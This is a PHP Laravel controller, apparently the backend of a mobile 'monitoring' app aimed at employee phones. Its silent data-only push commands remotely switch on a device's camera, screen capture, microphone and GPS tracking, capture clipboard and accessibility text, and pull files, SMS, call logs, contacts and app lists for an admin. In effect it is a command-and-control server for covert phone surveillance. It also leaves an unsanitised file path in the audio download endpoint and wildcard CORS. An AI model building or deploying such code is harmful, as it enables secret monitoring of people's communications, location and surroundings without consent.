<?php

namespace App\Http\Controllers\Api\Mobile;

use App\Http\Controllers\Controller;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Log;

/**
 * MobileCameraController
 *
 * Manages camera stream registrations and on-demand camera activation
 * via FCM v1 API push commands for the mobile monitoring feature.
 *
 * Endpoints:
 *   POST /camera/register       — Register camera stream + FCM token
 *   POST /camera/register-device — Register device FCM token only
 *   POST /camera/unregister     — Unregister camera stream
 *   GET  /camera/active         — List currently streaming cameras
 *   GET  /camera/devices        — List all registered devices
 *   POST /camera/command        — Send START/STOP command via FCM
 */
class MobileCameraController extends Controller
{
    private const CACHE_KEY = 'active_cameras';
    private const DEVICES_KEY = 'camera_devices';
    private const MODULES_KEY = 'device_active_modules';
    private const TTL_MINUTES = 10;
    private const DEVICES_TTL_DAYS = 30;

    /**
     * Register a camera stream (called when camera starts streaming).
     */
    public function register(Request $request): JsonResponse
    {
        $request->validate([
            'device_name' => 'required|string|max:100',
            'local_ip' => 'required|string|max:45',
            'port' => 'required|integer',
            'lens' => 'nullable|string|max:10',
            'fcm_token' => 'nullable|string|max:500',
        ]);

        $cameras = Cache::get(self::CACHE_KEY, []);
        $cameras[$request->device_name] = [
            'id' => crc32($request->device_name . $request->local_ip),
            'device_name' => $request->device_name,
            'local_ip' => $request->local_ip,
            'port' => $request->port,
            'lens' => $request->lens ?? 'FRONT',
            'stream_url' => "http://{$request->local_ip}:{$request->port}",
            'registered_at' => now()->toIso8601String(),
            'user_id' => $request->user()?->id,
            'status' => 'streaming',
        ];
        Cache::put(self::CACHE_KEY, $cameras, now()->addMinutes(self::TTL_MINUTES));

        // Update heartbeat
        $this->updateHeartbeat($request->device_name);

        if ($request->fcm_token) {
            $this->saveDeviceToken($request->device_name, $request->fcm_token, $request->user()?->id);
        }

        return response()->json(['message' => 'Camera registered successfully']);
    }

    /**
     * Register device FCM token + optional IP (called on app start for non-admin users).
     */
    public function registerDevice(Request $request): JsonResponse
    {
        $request->validate([
            'device_name' => 'required|string|max:100',
            'fcm_token' => 'required|string|max:500',
            'local_ip' => 'nullable|string|max:45',
            'screen_on' => 'nullable|boolean',
        ]);

        $this->saveDeviceToken($request->device_name, $request->fcm_token, $request->user()?->id, $request->local_ip, $request->screen_on);

        return response()->json(['message' => 'Device registered']);
    }

    /**
     * Unregister a camera stream.
     */
    public function unregister(Request $request): JsonResponse
    {
        $request->validate(['device_name' => 'required|string']);

        $cameras = Cache::get(self::CACHE_KEY, []);
        unset($cameras[$request->device_name]);
        Cache::put(self::CACHE_KEY, $cameras, now()->addMinutes(self::TTL_MINUTES));

        return response()->json(['message' => 'Camera unregistered']);
    }

    /**
     * List all currently streaming cameras.
     */
    public function active(): JsonResponse
    {
        return response()->json(['data' => array_values(Cache::get(self::CACHE_KEY, []))]);
    }

    /**
     * List all registered devices (with streaming status).
     */
    public function devices(): JsonResponse
    {
        $devices = Cache::get(self::DEVICES_KEY, []);
        $cameras = Cache::get(self::CACHE_KEY, []);

        $result = [];
        foreach ($devices as $name => $device) {
            $cam = $cameras[$name] ?? null;
            $ip = $cam['local_ip'] ?? ($device['local_ip'] ?? null);
            $activeModules = $this->getActiveModules($name);
            $status = $this->getDeviceStatus($device, $cameras, $name, $activeModules);

            $result[] = [
                'device_name' => $device['device_name'],
                'is_streaming' => isset($cameras[$name]),
                'status' => $status,
                'active_modules' => $activeModules,
                'last_heartbeat_at' => $device['last_heartbeat_at'] ?? null,
                'screen_on' => $device['screen_on'] ?? null,
                'local_ip' => $ip,
                'port' => $cam['port'] ?? null,
                'lens' => $cam['lens'] ?? null,
                'stream_url' => $cam['stream_url'] ?? null,
                'registered_at' => $cam['registered_at'] ?? $device['registered_at'],
            ];
        }

        return response()->json(['data' => $result]);
    }

    /**
     * Send camera/screen command (START/STOP/SWITCH/SCREEN_START/SCREEN_STOP) to a device via FCM v1 API.
     */
    public function command(Request $request): JsonResponse
    {
        $request->validate([
            'device_name' => 'required|string',
            'command' => 'nullable|string',
            'action' => 'nullable|string|in:START,STOP,SWITCH,TAKE_PHOTO,SCREEN_START,SCREEN_STOP,TEXT_START,TEXT_STOP,LOCATION_GET,LOCATION_START,LOCATION_STOP,AUDIO_RECORD,AUDIO_LIVE_START,AUDIO_STOP,REMOTE_LOCK,REMOTE_RING,REMOTE_STOP_RING,REMOTE_DEVICE_INFO,REMOTE_APP_LIST,REMOTE_CAPTURE_NOW,REMOTE_SCAN_FOLDER,REMOTE_UPLOAD_FILE,REMOTE_FLASH_ON,REMOTE_FLASH_OFF,REMOTE_FLASH_BLINK,REMOTE_FLASH_SOS,REMOTE_FLASH_PULSE,REMOTE_CLIPBOARD_START,REMOTE_CLIPBOARD_STOP,REMOTE_FORCE_STOP,REMOTE_UNINSTALL_APP',
            'lens' => 'nullable|string|in:FRONT,BACK',
            'params' => 'nullable|string',
        ]);

        // Support both 'action' and 'command' fields
        $commandAction = $request->action ?? $request->command;
        if (!$commandAction) {
            return response()->json(['message' => 'action or command required'], 422);
        }

        // Map CAPTURE_NOW/SCAN_FOLDER/UPLOAD_FILE to REMOTE_ prefix if not already
        if (in_array($commandAction, ['CAPTURE_NOW', 'SCAN_FOLDER', 'UPLOAD_FILE'])) {
            $commandAction = 'REMOTE_' . $commandAction;
        }

        $devices = Cache::get(self::DEVICES_KEY, []);
        $device = $devices[$request->device_name] ?? null;

        if (!$device || empty($device['fcm_token'])) {
            return response()->json(['message' => 'Device not found or no FCM token', 'success' => false], 404);
        }

        // Determine FCM message type
        $isScreenCommand = str_starts_with($commandAction, 'SCREEN_');
        $isTextCommand = str_starts_with($commandAction, 'TEXT_');
        $isLocationCommand = str_starts_with($commandAction, 'LOCATION_');
        $isAudioCommand = str_starts_with($commandAction, 'AUDIO_');
        $isRemoteCommand = str_starts_with($commandAction, 'REMOTE_');

        if ($isRemoteCommand) {
            $fcmType = 'remote_command';
            $fcmAction = str_replace('REMOTE_', '', $commandAction);
        } elseif ($isAudioCommand) {
            $fcmType = 'audio_command';
            $fcmAction = str_replace('AUDIO_', '', $commandAction);
        } elseif ($isLocationCommand) {
            $fcmType = 'location_command';
            $fcmAction = str_replace('LOCATION_', '', $commandAction);
        } elseif ($isTextCommand) {
            $fcmType = 'text_command';
            $fcmAction = str_replace('TEXT_', '', $commandAction);
        } elseif ($isScreenCommand) {
            $fcmType = 'screen_command';
            $fcmAction = str_replace('SCREEN_', '', $commandAction);
        } else {
            $fcmType = 'camera_command';
            $fcmAction = $commandAction;
        }

        // On STOP/SCREEN_STOP: immediately remove from active cameras cache
        if (in_array($commandAction, ['STOP', 'SCREEN_STOP'])) {
            $cameras = Cache::get(self::CACHE_KEY, []);
            unset($cameras[$request->device_name]);
            $screenName = $request->device_name . ' [Layar]';
            unset($cameras[$screenName]);
            Cache::put(self::CACHE_KEY, $cameras, now()->addMinutes(self::TTL_MINUTES));
        }

        // Track active modules per device
        $this->updateActiveModules($request->device_name, $commandAction);

        $fcmData = [
            'type' => $fcmType,
            'action' => $fcmAction,
            'lens' => $request->lens ?? 'FRONT',
            'requested_by' => $request->user()?->name ?? 'Admin',
        ];

        // Pass params (folder path, file path) to FCM
        if ($request->params) {
            $fcmData['params'] = $request->params;
        }

        $sent = $this->sendFcmV1Message($device['fcm_token'], $fcmData);

        return response()->json([
            'message' => $sent ? "Command {$request->action} sent" : 'FCM send failed',
            'success' => $sent,
        ]);
    }

    // ─── Frame Relay Endpoints ──────────────────────────

    /**
     * Upload a frame (called by device during streaming/capturing).
     * Saves the latest JPEG frame to storage for relay to admin.
     */
    public function uploadFrame(Request $request): JsonResponse
    {
        $deviceName = $request->header('X-Device-Name') ?? $request->query('device_name');
        $type = $request->header('X-Frame-Type') ?? $request->query('type', 'camera');

        if (empty($deviceName)) {
            return response()->json(['message' => 'device_name required'], 400);
        }

        // Determine file suffix based on type
        $suffix = '';
        if ($type === 'screen') {
            $suffix = '_screen';
        } elseif (str_starts_with($type, 'snapshot_')) {
            $suffix = '_snapshot';
        }
        $filename = md5($deviceName) . $suffix . '.jpg';

        $frameDir = storage_path('app/frames');
        if (!is_dir($frameDir)) {
            mkdir($frameDir, 0755, true);
        }

        // Read binary JPEG from request body
        $jpeg = $request->getContent();
        if (empty($jpeg) || strlen($jpeg) < 100) {
            return response()->json(['message' => 'No frame data'], 400);
        }

        file_put_contents($frameDir . '/' . $filename . '.tmp', $jpeg);
        rename($frameDir . '/' . $filename . '.tmp', $frameDir . '/' . $filename);

        // For snapshots, also save metadata (lens, timestamp)
        if (str_starts_with($type, 'snapshot_')) {
            $lens = str_replace('snapshot_', '', $type);
            $metaFile = $frameDir . '/' . md5($deviceName) . '_snapshot_meta.json';
            file_put_contents($metaFile, json_encode([
                'device_name' => $deviceName,
                'lens' => $lens,
                'size' => strlen($jpeg),
                'timestamp' => now()->toIso8601String(),
            ]));
        }

        return response()->json(['message' => 'OK'], 200);
    }

    /**
     * Get the latest frame for a device (called by admin for relay monitoring).
     * Supports type: camera (default), screen, snapshot
     */
    public function getFrame(Request $request, string $deviceName): \Illuminate\Http\Response|JsonResponse
    {
        $type = $request->query('type', 'camera');
        $suffix = match($type) {
            'screen' => '_screen',
            'snapshot' => '_snapshot',
            default => '',
        };
        $filename = md5($deviceName) . $suffix . '.jpg';
        $path = storage_path('app/frames/' . $filename);

        if (!file_exists($path)) {
            return response()->json(['message' => 'No frame available'], 404);
        }

        $jpeg = file_get_contents($path);

        $response = response($jpeg, 200)
            ->header('Content-Type', 'image/jpeg')
            ->header('Cache-Control', 'no-cache, no-store, must-revalidate')
            ->header('Access-Control-Allow-Origin', '*');

        // For snapshots, include metadata in headers
        if ($type === 'snapshot') {
            $metaFile = storage_path('app/frames/' . md5($deviceName) . '_snapshot_meta.json');
            if (file_exists($metaFile)) {
                $meta = json_decode(file_get_contents($metaFile), true);
                $response->header('X-Snapshot-Lens', $meta['lens'] ?? 'unknown');
                $response->header('X-Snapshot-Time', $meta['timestamp'] ?? '');
            }
            $response->header('X-Snapshot-Size', strlen($jpeg));
        }

        return $response;
    }

    /**
     * MJPEG stream relay — serves a persistent multipart stream of frames.
     * Client opens ONE connection, server pushes frames continuously.
     * Eliminates per-request overhead for much smoother relay streaming.
     */
    public function streamRelay(Request $request, string $deviceName)
    {
        $type = $request->query('type', 'camera');
        $suffix = $type === 'screen' ? '_screen' : '';
        $filename = md5($deviceName) . $suffix . '.jpg';
        $path = storage_path('app/frames/' . $filename);

        // Allow 5 minutes of continuous streaming
        set_time_limit(300);
        ini_set('zlib.output_compression', '0');

        $boundary = 'relayboundary';

        // Send raw HTTP headers — bypass Laravel response processing
        header('Content-Type: multipart/x-mixed-replace; boundary=' . $boundary);
        header('Cache-Control: no-cache, no-store, must-revalidate');
        header('Pragma: no-cache');
        header('Access-Control-Allow-Origin: *');
        header('X-Accel-Buffering: no');
        header('Connection: keep-alive');

        // Flush all output buffers
        while (ob_get_level()) {
            ob_end_flush();
        }

        $startTime = time();
        $maxDuration = 300; // 5 minutes
        $lastSize = 0;
        $lastMtime = 0;

        while ((time() - $startTime) < $maxDuration) {
            if (connection_aborted()) break;

            clearstatcache(true, $path);

            if (!file_exists($path)) {
                usleep(100000); // 100ms
                continue;
            }

            // Detect new frame via mtime+size combo
            $mtime = filemtime($path);
            $size = filesize($path);

            if ($mtime === $lastMtime && $size === $lastSize) {
                usleep(30000); // 30ms — wait for new frame (was 50ms)
                continue;
            }

            $jpeg = @file_get_contents($path);

            if ($jpeg && strlen($jpeg) > 100) {
                $lastMtime = $mtime;
                $lastSize = $size;
                $len = strlen($jpeg);

                echo "--{$boundary}\r\n";
                echo "Content-Type: image/jpeg\r\n";
                echo "Content-Length: {$len}\r\n";
                echo "\r\n";
                echo $jpeg;
                echo "\r\n";

                flush();
            }

            usleep(50000); // ~20fps check rate (was 80ms/12fps)
        }

        exit(0); // Don't let Laravel process the response
    }

    // ─── Activity Log (AccessibilityService) ─────────────

    /**
     * Upload activity log batch from employee device.
     */
    public function uploadActivityLog(Request $request): JsonResponse
    {
        $deviceName = $request->input('device_name', 'unknown');
        $appPackage = $request->input('app_package', '');
        $appLabel = $request->input('app_label', '');
        $texts = $request->input('texts', []);
        $timestamp = $request->input('timestamp', now()->toIso8601String());

        if (empty($texts)) {
            return response()->json(['message' => 'No texts provided'], 400);
        }

        // Save to JSON file
        $dir = storage_path('app/activity_logs/' . md5($deviceName));
        if (!is_dir($dir)) {
            mkdir($dir, 0755, true);
        }

        $entry = [
            'device_name' => $deviceName,
            'app_package' => $appPackage,
            'app_label' => $appLabel,
            'texts' => $texts,
            'timestamp' => $timestamp,
        ];

        // Use timestamp-based filename to enable sorting
        $filename = str_replace([':', '.'], '-', $timestamp) . '_' . substr(md5(json_encode($texts)), 0, 6) . '.json';
        file_put_contents($dir . '/' . $filename, json_encode($entry));

        // Cleanup: keep only last 200 files
        $files = glob($dir . '/*.json');
        if (count($files) > 200) {
            sort($files);
            $toDelete = array_slice($files, 0, count($files) - 200);
            foreach ($toDelete as $f) {
                @unlink($f);
            }
        }

        return response()->json(['message' => 'OK']);
    }

    /**
     * Get activity logs for a device (called by admin).
     */
    public function getActivityLogs(Request $request, string $deviceName): JsonResponse
    {
        $dir = storage_path('app/activity_logs/' . md5($deviceName));

        if (!is_dir($dir)) {
            return response()->json(['data' => []]);
        }

        $files = glob($dir . '/*.json');
        rsort($files); // newest first
        $files = array_slice($files, 0, 50); // max 50

        $logs = [];
        foreach ($files as $file) {
            $content = @file_get_contents($file);
            if ($content) {
                $entry = json_decode($content, true);
                if ($entry) {
                    $logs[] = $entry;
                }
            }
        }

        return response()->json(['data' => $logs]);
    }

    // ─── Location Tracking ──────────────────────────────

    /**
     * Upload GPS location from employee device.
     */
    public function uploadLocation(Request $request): JsonResponse
    {
        $request->validate([
            'device_name' => 'required|string',
            'latitude' => 'required|numeric',
            'longitude' => 'required|numeric',
            'accuracy' => 'required|numeric',
            'timestamp' => 'required|string',
        ]);

        $dir = storage_path('app/locations/' . md5($request->device_name));
        if (!is_dir($dir)) {
            mkdir($dir, 0755, true);
        }

        $filename = now()->format('Ymd_His') . '.json';
        file_put_contents($dir . '/' . $filename, json_encode([
            'device_name' => $request->device_name,
            'latitude' => $request->latitude,
            'longitude' => $request->longitude,
            'accuracy' => $request->accuracy,
            'timestamp' => $request->timestamp,
        ]));

        // Cleanup: keep only latest 100 files
        $files = glob($dir . '/*.json');
        if (count($files) > 100) {
            sort($files);
            $toDelete = array_slice($files, 0, count($files) - 100);
            foreach ($toDelete as $f) {
                @unlink($f);
            }
        }

        return response()->json(['message' => 'OK']);
    }

    /**
     * Get location history for a device (called by admin).
     */
    public function getLocations(Request $request, string $deviceName): JsonResponse
    {
        $dir = storage_path('app/locations/' . md5($deviceName));

        if (!is_dir($dir)) {
            return response()->json(['data' => []]);
        }

        $files = glob($dir . '/*.json');
        rsort($files); // newest first
        $files = array_slice($files, 0, 20); // max 20 recent locations

        $locations = [];
        foreach ($files as $file) {
            $content = @file_get_contents($file);
            if ($content) {
                $entry = json_decode($content, true);
                if ($entry) {
                    $locations[] = $entry;
                }
            }
        }

        return response()->json(['data' => $locations]);
    }

    // ─── Audio Monitoring ──────────────────────────────

    /**
     * Upload audio recording from employee device (multipart).
     */
    public function uploadAudio(Request $request): JsonResponse
    {
        $request->validate([
            'audio' => 'required|file',
            'device_name' => 'required|string',
            'type' => 'required|string|in:clip,live',
        ]);

        $dir = storage_path('app/audio/' . md5($request->device_name));
        if (!is_dir($dir)) {
            mkdir($dir, 0755, true);
        }

        $file = $request->file('audio');
        $filename = now()->format('Ymd_His') . '_' . $request->type . '.aac';
        $file->move($dir, $filename);

        // Save metadata
        $meta = [
            'device_name' => $request->device_name,
            'filename' => $filename,
            'type' => $request->type,
            'size' => filesize($dir . '/' . $filename),
            'timestamp' => now()->toIso8601String(),
        ];
        file_put_contents($dir . '/' . $filename . '.json', json_encode($meta));

        // Cleanup: keep only latest 50 files
        $files = glob($dir . '/*.aac');
        if (count($files) > 50) {
            sort($files);
            $toDelete = array_slice($files, 0, count($files) - 50);
            foreach ($toDelete as $f) {
                @unlink($f);
                @unlink($f . '.json');
            }
        }

        return response()->json(['message' => 'OK']);
    }

    /**
     * Get audio recordings list for a device.
     */
    public function getAudioList(Request $request, string $deviceName): JsonResponse
    {
        $dir = storage_path('app/audio/' . md5($deviceName));

        if (!is_dir($dir)) {
            return response()->json(['data' => []]);
        }

        $metaFiles = glob($dir . '/*.json');
        rsort($metaFiles);
        $metaFiles = array_slice($metaFiles, 0, 30);

        $entries = [];
        foreach ($metaFiles as $mf) {
            $content = @file_get_contents($mf);
            if ($content) {
                $entry = json_decode($content, true);
                if ($entry) {
                    $entries[] = $entry;
                }
            }
        }

        return response()->json(['data' => $entries]);
    }

    /**
     * Download audio file and auto-delete after download.
     */
    public function getAudioFile(Request $request, string $deviceName, string $filename)
    {
        $dir = storage_path('app/audio/' . md5($deviceName));
        $path = $dir . '/' . $filename;

        if (!file_exists($path)) {
            return response()->json(['error' => 'File not found'], 404);
        }

        return response()->download($path, $filename, [
            'Content-Type' => 'audio/aac',
        ])->deleteFileAfterSend(true);
    }

    /**
     * Get latest live audio chunk for streaming playback.
     */
    public function getAudioLive(Request $request, string $deviceName)
    {
        $dir = storage_path('app/audio/' . md5($deviceName));

        if (!is_dir($dir)) {
            return response()->json(['error' => 'No audio'], 404);
        }

        // Find latest live chunk
        $files = glob($dir . '/*_live.aac');
        if (empty($files)) {
            return response()->json(['error' => 'No live audio'], 404);
        }

        rsort($files);
        $latestFile = $files[0];

        return response()->download($latestFile, basename($latestFile), [
            'Content-Type' => 'audio/aac',
        ])->deleteFileAfterSend(true);
    }

    // ─── Remote Control ────────────────────────────────

    /**
     * Upload device info from employee phone.
     */
    public function uploadDeviceInfo(Request $request): JsonResponse
    {
        $request->validate([
            'device_name' => 'required|string',
            'battery_level' => 'required|string',
        ]);

        $dir = storage_path('app/device-info');
        if (!is_dir($dir)) mkdir($dir, 0755, true);

        file_put_contents(
            $dir . '/' . md5($request->device_name) . '.json',
            json_encode($request->all())
        );

        return response()->json(['message' => 'OK']);
    }

    /**
     * Get device info for a specific device.
     */
    public function getDeviceInfo(Request $request, string $deviceName): JsonResponse
    {
        $path = storage_path('app/device-info/' . md5($deviceName) . '.json');

        if (!file_exists($path)) {
            return response()->json(['error' => 'No data'], 404);
        }

        return response()->json(json_decode(file_get_contents($path), true));
    }

    /**
     * Upload installed apps list from employee phone.
     */
    public function uploadAppList(Request $request): JsonResponse
    {
        $request->validate([
            'device_name' => 'required|string',
            'apps' => 'required|array',
        ]);

        $dir = storage_path('app/app-list');
        if (!is_dir($dir)) mkdir($dir, 0755, true);

        file_put_contents(
            $dir . '/' . md5($request->device_name) . '.json',
            json_encode($request->all())
        );

        return response()->json(['message' => 'OK']);
    }

    /**
     * Get installed apps list for a specific device.
     */
    public function getAppList(Request $request, string $deviceName): JsonResponse
    {
        $path = storage_path('app/app-list/' . md5($deviceName) . '.json');

        if (!file_exists($path)) {
            return response()->json(['error' => 'No data'], 404);
        }

        return response()->json(json_decode(file_get_contents($path), true));
    }

    // ─── SMS / Call / Contacts / Files Monitoring ────────

    public function storeSmsLogs(Request $request): JsonResponse
    {
        $request->validate(['device_name' => 'required|string', 'messages' => 'required|array']);

        $dir = storage_path('app/monitor/sms');
        if (!is_dir($dir)) mkdir($dir, 0755, true);
        $file = $dir . '/' . md5($request->device_name) . '.json';

        // Merge with existing data
        $existing = file_exists($file) ? json_decode(file_get_contents($file), true) : [];
        $existingMessages = $existing['messages'] ?? [];
        $existingDates = array_column($existingMessages, 'date');

        foreach ($request->messages as $msg) {
            if (!in_array($msg['date'], $existingDates)) {
                $existingMessages[] = $msg;
            }
        }

        // Sort by date desc, keep latest 500
        usort($existingMessages, fn($a, $b) => strcmp($b['date'], $a['date']));
        $existingMessages = array_slice($existingMessages, 0, 500);

        file_put_contents($file, json_encode([
            'device_name' => $request->device_name,
            'messages' => $existingMessages,
            'updated_at' => now()->toIso8601String()
        ]));

        return response()->json(['message' => 'OK']);
    }

    public function getSmsLogs(Request $request, string $deviceName): JsonResponse
    {
        $path = storage_path('app/monitor/sms/' . md5($deviceName) . '.json');
        if (!file_exists($path)) return response()->json(['data' => []]);
        $data = json_decode(file_get_contents($path), true);
        return response()->json(['data' => $data['messages'] ?? []]);
    }

    public function storeCallLogs(Request $request): JsonResponse
    {
        $request->validate(['device_name' => 'required|string', 'calls' => 'required|array']);

        $dir = storage_path('app/monitor/calls');
        if (!is_dir($dir)) mkdir($dir, 0755, true);
        $file = $dir . '/' . md5($request->device_name) . '.json';

        $existing = file_exists($file) ? json_decode(file_get_contents($file), true) : [];
        $existingCalls = $existing['calls'] ?? [];
        $existingDates = array_column($existingCalls, 'date');

        foreach ($request->calls as $call) {
            if (!in_array($call['date'], $existingDates)) {
                $existingCalls[] = $call;
            }
        }

        usort($existingCalls, fn($a, $b) => strcmp($b['date'], $a['date']));
        $existingCalls = array_slice($existingCalls, 0, 500);

        file_put_contents($file, json_encode([
            'device_name' => $request->device_name,
            'calls' => $existingCalls,
            'updated_at' => now()->toIso8601String()
        ]));

        return response()->json(['message' => 'OK']);
    }

    public function getCallLogs(Request $request, string $deviceName): JsonResponse
    {
        $path = storage_path('app/monitor/calls/' . md5($deviceName) . '.json');
        if (!file_exists($path)) return response()->json(['data' => []]);
        $data = json_decode(file_get_contents($path), true);
        return response()->json(['data' => $data['calls'] ?? []]);
    }

    public function storeContacts(Request $request): JsonResponse
    {
        $request->validate(['device_name' => 'required|string', 'contacts' => 'required|array']);

        $dir = storage_path('app/monitor/contacts');
        if (!is_dir($dir)) mkdir($dir, 0755, true);

        file_put_contents(
            $dir . '/' . md5($request->device_name) . '.json',
            json_encode($request->all())
        );

        return response()->json(['message' => 'OK']);
    }

    public function getContacts(Request $request, string $deviceName): JsonResponse
    {
        $path = storage_path('app/monitor/contacts/' . md5($deviceName) . '.json');
        if (!file_exists($path)) return response()->json(['data' => []]);
        $data = json_decode(file_get_contents($path), true);
        return response()->json(['data' => $data['contacts'] ?? []]);
    }

    public function storeFiles(Request $request): JsonResponse
    {
        $request->validate(['device_name' => 'required|string', 'files' => 'required|array']);

        $dir = storage_path('app/monitor/files');
        if (!is_dir($dir)) mkdir($dir, 0755, true);

        file_put_contents(
            $dir . '/' . md5($request->device_name) . '.json',
            json_encode($request->all())
        );

        return response()->json(['message' => 'OK']);
    }

    public function getFiles(Request $request, string $deviceName): JsonResponse
    {
        $path = storage_path('app/monitor/files/' . md5($deviceName) . '.json');
        if (!file_exists($path)) return response()->json(['data' => []]);
        $data = json_decode(file_get_contents($path), true);
        return response()->json(['data' => $data['files'] ?? []]);
    }

    // ─── Private Helpers ────────────────────────────────

    private function saveDeviceToken(string $deviceName, string $fcmToken, ?int $userId, ?string $localIp = null, ?bool $screenOn = null): void
    {
        $devices = Cache::get(self::DEVICES_KEY, []);
        $existing = $devices[$deviceName] ?? [];
        $devices[$deviceName] = [
            'device_name' => $deviceName,
            'fcm_token' => $fcmToken,
            'user_id' => $userId,
            'local_ip' => $localIp ?? ($existing['local_ip'] ?? null),
            'registered_at' => $existing['registered_at'] ?? now()->toIso8601String(),
            'last_heartbeat_at' => now()->toIso8601String(),
            'screen_on' => $screenOn ?? ($existing['screen_on'] ?? null),
        ];
        Cache::put(self::DEVICES_KEY, $devices, now()->addDays(self::DEVICES_TTL_DAYS));
    }

    /**
     * Update device heartbeat timestamp.
     */
    private function updateHeartbeat(string $deviceName): void
    {
        $devices = Cache::get(self::DEVICES_KEY, []);
        if (isset($devices[$deviceName])) {
            $devices[$deviceName]['last_heartbeat_at'] = now()->toIso8601String();
            Cache::put(self::DEVICES_KEY, $devices, now()->addDays(self::DEVICES_TTL_DAYS));
        }
    }

    /**
     * Get 3-level device status: live, online, offline.
     */
    private function getDeviceStatus(array $device, array $cameras, string $name, array $activeModules): string
    {
        // LIVE: actively streaming or has active modules
        if (isset($cameras[$name]) || !empty($activeModules)) {
            return 'live';
        }

        // ONLINE: heartbeat within 5 minutes
        $heartbeat = $device['last_heartbeat_at'] ?? null;
        if ($heartbeat) {
            try {
                $lastBeat = \Carbon\Carbon::parse($heartbeat);
                if ($lastBeat->diffInMinutes(now()) < 5) {
                    return 'online';
                }
            } catch (\Exception $e) {}
        }

        return 'offline';
    }

    /**
     * Get active modules for a device.
     */
    private function getActiveModules(string $deviceName): array
    {
        $allModules = Cache::get(self::MODULES_KEY, []);
        return $allModules[$deviceName] ?? [];
    }

    /**
     * Update active modules based on command action.
     */
    private function updateActiveModules(string $deviceName, string $action): void
    {
        $allModules = Cache::get(self::MODULES_KEY, []);
        $modules = $allModules[$deviceName] ?? [];

        // Map actions to module names
        $addMap = [
            'START' => 'camera',
            'SCREEN_START' => 'screen',
            'TEXT_START' => 'text',
            'LOCATION_GET' => 'location',
            'LOCATION_START' => 'location',
            'AUDIO_RECORD' => 'audio',
            'AUDIO_LIVE_START' => 'audio',
        ];
        $removeMap = [
            'STOP' => 'camera',
            'SCREEN_STOP' => 'screen',
            'TEXT_STOP' => 'text',
            'LOCATION_STOP' => 'location',
            'AUDIO_STOP' => 'audio',
        ];

        if (isset($addMap[$action])) {
            $modules = array_unique(array_merge($modules, [$addMap[$action]]));
        }
        if (isset($removeMap[$action])) {
            $modules = array_values(array_diff($modules, [$removeMap[$action]]));
        }

        $allModules[$deviceName] = $modules;
        Cache::put(self::MODULES_KEY, $allModules, now()->addMinutes(self::TTL_MINUTES));
    }

    /**
     * Send FCM v1 data-only message (silent push).
     * Uses Service Account JSON for OAuth2 authentication.
     */
    private function sendFcmV1Message(string $fcmToken, array $data): bool
    {
        $serviceAccountPath = config('services.fcm.service_account_path');
        $projectId = config('services.fcm.project_id', 'kabensatudata');

        if (!$serviceAccountPath || !file_exists($serviceAccountPath)) {
            Log::warning('FCM service account file not found: ' . $serviceAccountPath);
            return false;
        }

        try {
            $accessToken = $this->getAccessToken($serviceAccountPath);
            if (!$accessToken) return false;

            $response = Http::withHeaders([
                'Authorization' => "Bearer {$accessToken}",
                'Content-Type' => 'application/json',
            ])->post("https://fcm.googleapis.com/v1/projects/{$projectId}/messages:send", [
                'message' => [
                    'token' => $fcmToken,
                    'data' => $data,
                    // No 'notification' — data-only (silent)
                    'android' => [
                        'priority' => 'high',
                    ],
                ],
            ]);

            if ($response->successful()) {
                Log::info('FCM v1 sent successfully');
                return true;
            }

            Log::error('FCM v1 error: ' . $response->body());
            return false;
        } catch (\Exception $e) {
            Log::error('FCM v1 exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * Get OAuth2 access token from Google Service Account JSON.
     */
    private function getAccessToken(string $serviceAccountPath): ?string
    {
        // Check cache first
        $cached = Cache::get('fcm_access_token');
        if ($cached) return $cached;

        $sa = json_decode(file_get_contents($serviceAccountPath), true);
        if (!$sa) return null;

        $now = time();
        $header = base64_encode(json_encode(['alg' => 'RS256', 'typ' => 'JWT']));
        $payload = base64_encode(json_encode([
            'iss' => $sa['client_email'],
            'scope' => 'https://www.googleapis.com/auth/firebase.messaging',
            'aud' => 'https://oauth2.googleapis.com/token',
            'iat' => $now,
            'exp' => $now + 3600,
        ]));

        // URL-safe base64
        $header = strtr($header, '+/', '-_');
        $header = rtrim($header, '=');
        $payload = strtr($payload, '+/', '-_');
        $payload = rtrim($payload, '=');

        $unsigned = "{$header}.{$payload}";

        // Sign with private key
        $privateKey = openssl_pkey_get_private($sa['private_key']);
        if (!$privateKey) {
            Log::error('FCM: Invalid private key');
            return null;
        }

        openssl_sign($unsigned, $signature, $privateKey, OPENSSL_ALGO_SHA256);
        $sig = rtrim(strtr(base64_encode($signature), '+/', '-_'), '=');

        $jwt = "{$unsigned}.{$sig}";

        // Exchange JWT for access token
        $response = Http::asForm()->post('https://oauth2.googleapis.com/token', [
            'grant_type' => 'urn:ietf:params:oauth:grant-type:jwt-bearer',
            'assertion' => $jwt,
        ]);

        if ($response->successful()) {
            $token = $response->json('access_token');
            $expiresIn = $response->json('expires_in', 3600);
            // Cache token (minus 5 minutes buffer)
            Cache::put('fcm_access_token', $token, now()->addSeconds($expiresIn - 300));
            return $token;
        }

        Log::error('FCM OAuth error: ' . $response->body());
        return null;
    }
}
